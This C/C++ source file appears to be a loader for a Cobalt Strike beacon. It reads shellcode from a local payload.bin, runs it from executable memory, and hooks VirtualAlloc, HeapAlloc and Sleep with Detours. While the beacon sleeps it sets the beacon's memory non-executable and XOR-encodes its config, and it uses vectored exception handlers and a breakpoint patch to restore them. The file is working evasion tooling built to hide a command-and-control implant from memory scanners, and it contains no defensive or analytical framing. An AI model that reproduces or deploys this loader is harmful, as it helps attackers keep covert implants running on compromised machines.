
#include "stdio.h"
#include<Windows.h>
#include <string.h>


#include "./Detours/include/detours.h"
#include "./Detours/include/detver.h"
#pragma comment(lib,"./Detours/lib.X64/detours.lib")

LPVOID Beacon_config;
SIZE_T Beacon_config_length;
LPVOID Beacon_address;
SIZE_T Beacon_data_len;
DWORD Beacon_Memory_address_flOldProtect;
HANDLE hEvent;


BOOL Vir_FLAG = TRUE;
LPVOID shellcode_addr;
int count = 0;

static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
#if _MSC_VER < 1300
static LPVOID(WINAPI*
	OldHeapAlloc)(HANDLE hHeap, DWORD dwFlags, DWORD dwBytes)
	= HeapAlloc;
#else
static LPVOID(WINAPI*
	OldHeapAlloc)(HANDLE hHeap, DWORD dwFlags, DWORD_PTR dwBytes)
	= HeapAlloc;
#endif

void xor_result(char* src, int length)
{
	for (int i = 0; i < length; i++)
	{
		src[i] ^= 0x4e;
	}
}

#if _MSC_VER < 1300
LPVOID WINAPI NewHeapAlloc(HANDLE hHeap, DWORD dwFlags, DWORD dwBytes)
#else
LPVOID WINAPI NewHeapAlloc(HANDLE hHeap, DWORD dwFlags, DWORD_PTR dwBytes)
#endif

{
	LPVOID heapaddr;
	if (dwBytes < 0x10000)
		return OldHeapAlloc(hHeap, dwFlags, dwBytes);
	else
		heapaddr = OldHeapAlloc(hHeap, dwFlags, dwBytes);

	printf("before len:%llx \n", dwBytes);
	printf("before address:%p \n", heapaddr);
	if (dwBytes == 0x800)
	{
		printf("HeapAlloc address:%p \n", heapaddr);
		printf("HeapAlloc len:%llx \n", dwBytes);
	}
	return heapaddr;
	//printf("arguements: %llx %llx %llx", hHeap, dwFlags, dwBytes);
	//return heapaddr;
	//if (heapaddr == 0)
	//{
	//	return NULL;
	//}
	//Beacon_address = heapaddr;
	//Beacon_data_len = dwBytes;
	//printf("分配大小:%d", Beacon_data_len);
	//printf("分配地址:%llx \n", Beacon_address);
	//return Beacon_address;
}

LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	count++;
	if (dwSize != 0x4e000)
		return OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
	Beacon_data_len = dwSize;
	Beacon_address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
	printf("Beacon 分配大小:%llx\n", Beacon_data_len);
	printf("Beacon 分配地址:%p \n", Beacon_address);
	return Beacon_address;
}

static VOID(WINAPI* OldSleep)(DWORD dwMilliseconds) = Sleep;
void WINAPI NewSleep(DWORD dwMilliseconds)
{
	if (Vir_FLAG)
	{
		VirtualFree(shellcode_addr, 0, MEM_RELEASE);
		Vir_FLAG = false;
	}
	printf("sleep时间:%d\n", dwMilliseconds);
	SetEvent(hEvent);
	OldSleep(dwMilliseconds);
}

void Hook()
{
	DetourRestoreAfterWith(); //避免重复HOOK
	DetourTransactionBegin(); // 开始HOOK
	DetourUpdateThread(GetCurrentThread());
	DetourAttach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
	DetourAttach((PVOID*)&OldHeapAlloc, NewHeapAlloc);

	DetourAttach((PVOID*)&OldSleep, NewSleep);
	DetourTransactionCommit(); //  提交HOOK
}

void UnHook()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
	DetourDetach((PVOID*)&OldHeapAlloc, NewHeapAlloc);
	DetourTransactionCommit();
}



BOOL is_Exception(DWORD64 Exception_addr)
{
	if (Exception_addr < ((DWORD64)Beacon_address + Beacon_data_len) && Exception_addr >(DWORD64)Beacon_address)
	{
		printf("地址符合:%llx\n", Exception_addr);
		return true;
	}
	printf("地址不符合:%llx\n", Exception_addr);
	return false;
}

LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)
{
	printf("FirstVectExcepHandler\n");
	printf("异常错误码:%x\n", pExcepInfo->ExceptionRecord->ExceptionCode);
	printf("线程地址:%llx\n", pExcepInfo->ContextRecord->Rip);
	if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(pExcepInfo->ContextRecord->Rip))
	{
		printf("恢复Beacon内存属性\n");
		xor_result((char*)Beacon_config, Beacon_config_length);
		VirtualProtect(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);
		
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

DWORD WINAPI Beacon_set_Memory_attributes(LPVOID lpParameter)
{
	printf("Beacon_set_Memory_attributes启动\n");
	while (true)
	{
		WaitForSingleObject(hEvent, INFINITE);
		if (Beacon_address == 0 || Beacon_data_len == 0)
		{
			printf("Not find beacon now\n");
			ResetEvent(hEvent);
		}
		else
		{
			printf("设置Beacon内存属性不可执行\n");
			VirtualProtect(Beacon_address, Beacon_data_len, PAGE_READWRITE, &Beacon_Memory_address_flOldProtect);
			xor_result((char*)Beacon_config, Beacon_config_length);
			ResetEvent(hEvent);
		}
	}
	return 0;
}
size_t GetSize(const char* szFilePath)
{
	size_t size;
	FILE* f = fopen(szFilePath, "rb");
	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);
	return size;
}

unsigned char* ReadBinaryFile(const char* szFilePath, size_t* size)
{
	unsigned char* p = NULL;
	FILE* f = NULL;
	size_t res = 0;
	*size = GetSize(szFilePath);
	if (*size == 0) return NULL;
	f = fopen(szFilePath, "rb");
	if (f == NULL)
	{
		printf("Binary file does not exists!\n");
		return 0;
	}
	p = new unsigned char[*size];
	// Read file
	rewind(f);
	res = fread(p, sizeof(unsigned char), *size, f);
	fclose(f);
	if (res == 0)
	{
		delete[] p;
		return NULL;
	}
	return p;
}



LONG WINAPI
VectoredHandler(
	struct _EXCEPTION_POINTERS* ExceptionInfo
)
{
	LONG lResult = EXCEPTION_CONTINUE_SEARCH;
	PEXCEPTION_RECORD pExceptionRecord;
	PCONTEXT pContextRecord;

	pExceptionRecord = ExceptionInfo->ExceptionRecord;
	pContextRecord = ExceptionInfo->ContextRecord;

	NTSTATUS stat;
	DWORD_PTR Base_addr;

	printf("ExceptionAddress = 0x%p\n", pExceptionRecord->ExceptionAddress);
	DWORD dwOldProtect;
	if (pExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT
		&& LOWORD(pContextRecord->Rip) == 0x86BB)//判断后面四位
	{
		Base_addr = pContextRecord->Rip - 0x86BB;
		printf("RSP = 0x%p\n", pContextRecord->Rsp);
		printf("RIP = 0x%p\n", pContextRecord->Rip);
		printf("RCX = 0x%p\n", pContextRecord->Rcx);
		//stat = VirtualProtect((PVOID*)Base_addr, 0x20000, PAGE_EXECUTE_READWRITE, &dwOldProtect);
		Beacon_config_length = pContextRecord->Rcx;
		Beacon_config = OldVirtualAlloc(0, pContextRecord->Rcx, MEM_COMMIT, PAGE_READWRITE);
		pContextRecord->Rax = (DWORD_PTR)Beacon_config;
		pContextRecord->Rip = pContextRecord->Rip + 5;
		//pContextRecord->Rip -= 0x1;
		//stat = VirtualProtect((PVOID*)Base_addr, 0x20000, PAGE_EXECUTE_READ, &dwOldProtect);
		lResult = EXCEPTION_CONTINUE_EXECUTION;
	}
	return lResult;
}
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

//https://github.com/ssllab/temper1/blob/722991add4a6a239271e1f029ebe4daaad719496/strreplace.c
char* strreplace(char const* const original,
	char const* const pattern, char const* const replacement)
{
	size_t const replen = strlen(replacement);
	size_t const patlen = strlen(pattern);
	size_t const orilen = strlen(original);

	size_t patcnt = 0;
	const char* oriptr;
	const char* patloc;

	// find how many times the pattern occurs in the original string
	for (oriptr = original; (patloc = strstr(oriptr, pattern)); oriptr = patloc + patlen)
	{
		patcnt++;
	}

	{
		// allocate memory for the new string
		size_t const retlen = orilen + patcnt * (replen - patlen);
		char* const returned = (char*)malloc(sizeof(char) * (retlen + 1));

		if (returned != NULL)
		{
			// copy the original string, 
			// replacing all the instances of the pattern
			char* retptr = returned;
			for (oriptr = original; (patloc = strstr(oriptr, pattern)); oriptr = patloc + patlen)
			{
				size_t const skplen = patloc - oriptr;
				// copy the section until the occurence of the pattern
				strncpy(retptr, oriptr, skplen);
				retptr += skplen;
				// copy the replacement 
				strncpy(retptr, replacement, replen);
				retptr += replen;
			}
			// copy the rest of the string.
			strcpy(retptr, oriptr);
		}
		return returned;
	}
}


const char ori_malloc[5] = {
	0xE8, 0x58, 0x16, 0x00, 0x00
};
const char patch_malloc[5] = {
	0xCC, 0x58, 0x16, 0x00, 0x00
};
//47718
int main()
{
	hEvent = CreateEvent(NULL, TRUE, false, NULL);

	AddVectoredExceptionHandler(1, &FirstVectExcepHandler);
	AddVectoredExceptionHandler(2, &VectoredHandler);
	HANDLE hThread1 = CreateThread(NULL, 0, Beacon_set_Memory_attributes, NULL, 0, NULL);
	CloseHandle(hThread1);


	LPVOID shellcode_addr;
	DWORD Beacon_Memory_address_flOldProtect;
	/* length: 892 bytes */
	unsigned char* BinData = NULL;
	size_t size = 0;
	const char* szFilePath = "C:\\Users\\Lihua\\Desktop\\payload.bin";
	BinData = ReadBinaryFile(szFilePath, &size);
	//BinData = strreplace(BinData, ori_malloc,patch_malloc)

	shellcode_addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(shellcode_addr, BinData, size);
	Hook();
	VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);
	(*(int(*)()) shellcode_addr)();

	UnHook();

	return 0;
}